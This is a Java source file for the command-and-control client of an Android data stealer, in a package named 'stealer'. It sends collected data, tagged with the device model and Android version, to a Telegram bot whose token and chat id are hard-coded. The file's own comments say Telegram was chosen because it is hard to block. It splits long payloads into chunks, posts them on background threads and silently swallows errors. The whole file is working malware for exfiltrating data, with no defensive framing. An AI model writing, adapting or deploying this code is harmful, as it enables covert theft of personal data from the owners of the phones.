// lang: Java, file: C2Client.java, target: Android 8+ API 26
// exfil via Telegram Bot API — no own server needed, HTTPS, hard to block

package com.example.zeca.stealer;

import android.content.Context;
import android.os.Build;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;

public class C2Client {

    // replace with your bot token and chat id
    private static final String BOT_TOKEN = "8743266929:AAEFSPl6NZwpXmjPT-tqmp6kWwF0MirVF1I";
    private static final String CHAT_ID   = "7511153867";
    private static final String API_URL   =
        "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

    // max Telegram message length
    private static final int MAX_LEN = 4096;

    public static void send(Context ctx, String tag, String data) {
        String deviceId = Build.MODEL + " / " + Build.VERSION.RELEASE;
        String payload  = "[" + tag + "] " + deviceId + "\n" + data;

        // chunk long messages
        int start = 0;
        while (start < payload.length()) {
            int end = Math.min(start + MAX_LEN, payload.length());
            postAsync(payload.substring(start, end));
            start = end;
        }
    }

    private static void postAsync(String text) {
        new Thread(() -> {
            try {
                URL url = new URL(API_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15_000);
                conn.setReadTimeout(15_000);

                // escape quotes in text
                String safe = text.replace("\\", "\\\\").replace("\"", "\\\"");
                String json = "{\"chat_id\":\"" + CHAT_ID + "\"," +
                              "\"text\":\"" + safe + "\"}";

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }

                conn.getInputStream().close(); // drain response
            } catch (Exception ignored) {}
        }).start();
    }
}